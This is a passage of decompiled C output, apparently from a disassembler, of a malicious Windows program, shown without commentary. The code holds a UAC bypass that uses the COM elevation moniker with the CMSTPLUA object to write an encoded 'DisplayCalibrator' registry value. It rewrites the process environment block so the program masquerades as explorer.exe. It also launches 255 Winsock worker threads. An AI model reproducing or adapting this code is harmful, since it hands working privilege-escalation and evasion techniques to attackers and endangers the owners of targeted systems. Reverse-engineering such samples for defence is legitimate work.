      InitializeCriticalSection(&stru_41D2D4);
      Sleep(0x3A98u);
      sub_413590();
      if ( dword_41D33C )
      {
        for ( i = 0; i < 0xFF; ++i )
          CreateThread(0, 0x10000u, (LPTHREAD_START_ROUTINE)sub_413140, 0, 0, &ThreadId);
        do
        {
          do
            Sleep(0x3E8u);
          while ( dword_41D33C );
        }
        while ( dword_41D338 );
        InterlockedFlushSList(Block);
        DeleteCriticalSection(&stru_41D2D4);
        WSACleanup();
        if ( Block )
          free(Block);
        ExitThread(0);
      }
      InterlockedFlushSList(Block);
      DeleteCriticalSection(&stru_41D2D4);
    }
    WSACleanup();
  }
  return 0;
}
// 41D338: using guessed type int dword_41D338;
// 41D33C: using guessed type int dword_41D33C;

//----- (004139B0) --------------------------------------------------------
HRESULT __fastcall sub_4139B0(WCHAR *lpString2, IID *riid, int a3, void **a4)
{
  void *v6; // edx
  int v7; // ecx
  BIND_OPTS *p_pBindOptions; // eax
  HRESULT result; // eax
  WCHAR String1[260]; // [esp+8h] [ebp-26Ch] BYREF
  BIND_OPTS pBindOptions; // [esp+210h] [ebp-64h] BYREF
  int v12; // [esp+224h] [ebp-50h]
  WCHAR String2[30]; // [esp+234h] [ebp-40h] BYREF
  void *ppv; // [esp+270h] [ebp-4h] BYREF

  ppv = 0;
  if ( sub_40A200(lpString2) > 64 )
  {
    result = -2147467259;
    *a4 = v6;
  }
  else
  {
    v7 = 36;
    p_pBindOptions = &pBindOptions;
    do
    {
      LOBYTE(p_pBindOptions->cbStruct) = (_BYTE)v6;
      p_pBindOptions = (BIND_OPTS *)((char *)p_pBindOptions + 1);
      --v7;
    }
    while ( v7 );
    pBindOptions.cbStruct = 36;
    v12 = 4;
    wcscpy(String2, L"Elevation:Administrator!new:");
    lstrcpyW(String1, String2);
    lstrcatW(String1, lpString2);
    result = CoGetObject(String1, &pBindOptions, riid, &ppv);
    *a4 = ppv;
  }
  return result;
}
// 4139E0: variable 'v6' is possibly undefined

//----- (00413AC0) --------------------------------------------------------
void __stdcall EnumProc(PLDR_DATA_TABLE_ENTRY ModuleInformation, PVOID Parameter, BOOLEAN *Stop)
{
  const WCHAR *v3; // eax
  const WCHAR *v4; // ebx
  int v5[7]; // [esp+4h] [ebp-1Ch] BYREF

  if ( ModuleInformation->DllBase == NtCurrentTeb()->ProcessEnvironmentBlock->ImageBaseAddress )
  {
    if ( Parameter )
    {
      v3 = SourceString;
      v4 = dword_41D2F8;
    }
    else
    {
      v4 = (const WCHAR *)v5;
      dword_41D2F8 = ModuleInformation->BaseDllName.Buffer;
      SourceString = ModuleInformation->FullDllName.Buffer;
      v3 = (const WCHAR *)BaseAddress;
      v5[0] = 6619228;
      v5[1] = 7340152;
      v5[2] = 7274604;
      v5[3] = 6619250;
      v5[4] = 3014770;
      v5[5] = 7864421;
      v5[6] = 101;
    }
    RtlInitUnicodeString(&ModuleInformation->FullDllName, v3);
    RtlInitUnicodeString(&ModuleInformation->BaseDllName, v4);
    *Stop = 1;
  }
  else
  {
    *Stop = 0;
  }
}

//----- (00413B70) --------------------------------------------------------
BOOL __thiscall sub_413B70(void *this)
{
  int v1; // edi
  HRESULT v2; // eax
  int v3; // ebx
  int v4; // esi
  HRESULT v5; // eax
  HRESULT v7; // [esp+Ch] [ebp-150h]
  int v9[30]; // [esp+14h] [ebp-148h] BYREF
  __int16 v10; // [esp+8Ch] [ebp-D0h]
  int v11[20]; // [esp+90h] [ebp-CCh] BYREF
  WCHAR String2[2]; // [esp+E0h] [ebp-7Ch] BYREF
  void *v13; // [esp+F4h] [ebp-68h]
  int v14; // [esp+F8h] [ebp-64h]
  int v15; // [esp+FCh] [ebp-60h]
  int v16; // [esp+100h] [ebp-5Ch]
  int v17; // [esp+104h] [ebp-58h]
  int v18; // [esp+108h] [ebp-54h]
  int v19; // [esp+10Ch] [ebp-50h]
  void *v20; // [esp+110h] [ebp-4Ch]
  int v21; // [esp+114h] [ebp-48h]
  int v22; // [esp+118h] [ebp-44h]
  int v23; // [esp+11Ch] [ebp-40h]
  int v24; // [esp+120h] [ebp-3Ch]
  int v25; // [esp+124h] [ebp-38h]
  int v26; // [esp+128h] [ebp-34h]
  __int16 v27; // [esp+12Ch] [ebp-30h]
  int v28[9]; // [esp+130h] [ebp-2Ch] BYREF
  int v29; // [esp+154h] [ebp-8h] BYREF
  int v30; // [esp+158h] [ebp-4h] BYREF

  v1 = 0;
  v29 = 0;
  v30 = 0;
  v7 = CoInitializeEx(0, 2u);
  wmemcpy(String2, L"{3E5FC7F9-", 10);
  v27 = 0;
  v13 = &loc_410039;
  v14 = 3211317;
  v15 = 3407917;
  v16 = 3538995;
  v17 = 2949175;
  v18 = 3145785;
  v19 = 3342390;
  v20 = &loc_41002D;
  v21 = 3276849;
  v22 = 3276848;
  v23 = 3407924;
  v24 = 4325446;
  v25 = 4390981;
  v26 = 8192055;
  v2 = sub_4139B0(String2, (IID *)&riid, 65, (void **)&v29);
  v3 = v29;
  v4 = v2;
  if ( !v2 )
  {
    if ( !v29 )
    {
      v4 = -2147024882;
      goto LABEL_11;
    }
    v28[0] = 6881348;
    v28[1] = 7340147;
    v28[2] = 6357100;
    v28[3] = 4391033;
    v28[4] = 7077985;
    v28[5] = 6422633;
    v28[6] = 6357106;
    v28[7] = 7274612;
    v28[8] = 114;
    v9[0] = 7274579;
    v9[1] = 7602278;
    v9[2] = 6357111;
    v9[3] = 6619250;
    v9[4] = 5046364;
    v9[5] = 6488169;
    v9[6] = 7274610;
    v9[7] = 7274611;
    v9[8] = 7602278;
    v9[9] = 5701724;
    v9[10] = 7209065;
    v9[11] = 7274596;
    v9[12] = 7536759;
    v9[13] = 5111840;
    v9[14] = 6029396;
    v9[15] = 7667779;
    v9[16] = 7471218;
    v9[17] = 7209061;
    v9[18] = 5636212;
    v9[19] = 7471205;
    v9[20] = 6881395;
    v9[21] = 7209071;
    v9[22] = 4784220;
    v9[23] = 5046339;
    v9[24] = 4391004;
    v9[25] = 7077985;
    v9[26] = 6422633;
    v9[27] = 6357106;
    v9[28] = 6881396;
    v9[29] = 7209071;
    v10 = 0;
    v4 = (*(int (__stdcall **)(int, int, int *, int *, void *))(*(_DWORD *)v29 + 40))(v29, -2147483646, v9, v28, this);
    if ( v4 >= 0 )
    {
      wcscpy((wchar_t *)v11, L"{D2E7041B-2927-42fb-8E9F-7CE93B6DC937}");
      v5 = sub_4139B0((WCHAR *)v11, (IID *)&stru_418F58, 67, (void **)&v30);
      v1 = v30;
      v4 = v5;
      if ( !v5 )
      {
        if ( v30 )
          v4 = (*(int (__stdcall **)(int, _DWORD))(*(_DWORD *)v30 + 56))(v30, 0);
        else
          v4 = -2147024882;
      }
    }
  }
  if ( v3 )
    (*(void (__stdcall **)(int))(*(_DWORD *)v3 + 8))(v3);
  if ( v1 )
    (*(void (__stdcall **)(int))(*(_DWORD *)v1 + 8))(v1);
LABEL_11:
  if ( !v7 )
    CoUninitialize();
  return v4 >= 0;
}

//----- (00413F30) --------------------------------------------------------
NTSTATUS sub_413F30()
{
  PPEB ProcessEnvironmentBlock; // edi
  WCHAR Buffer[262]; // [esp+Ch] [ebp-248h] BYREF
  ULONG_PTR RegionSize; // [esp+218h] [ebp-3Ch] BYREF
  WCHAR String2[14]; // [esp+21Ch] [ebp-38h] BYREF
  WCHAR SourceString[14]; // [esp+238h] [ebp-1Ch] BYREF

  ProcessEnvironmentBlock = NtCurrentTeb()->ProcessEnvironmentBlock;
  BaseAddress = 0;
  RegionSize = 4096;
  if ( NtAllocateVirtualMemory((HANDLE)0xFFFFFFFF, &BaseAddress, 0, &RegionSize, 0x3000u, 4u) >= 0 )
  {
    GetWindowsDirectoryW(Buffer, 0x104u);
    wcscpy(String2, L"\\explorer.exe");
    lstrcpyW((LPWSTR)BaseAddress, Buffer);
    lstrcatW((LPWSTR)BaseAddress, String2);
  }
  RtlAcquirePebLock();
  wcscpy(SourceString, L"explorer.exe");
  RtlInitUnicodeString(&ProcessEnvironmentBlock->ProcessParameters->ImagePathName, (PCWSTR)BaseAddress);
  RtlInitUnicodeString(&ProcessEnvironmentBlock->ProcessParameters->CommandLine, SourceString);
  RtlReleasePebLock();
  return LdrEnumerateLoadedModules(0, EnumProc, 0);
}

// nfuncs=145 queued=141 decompiled=141 lumina nreq=0 worse=0 better=0
// ALL OK, 141 function(s) have been successfully decompiled
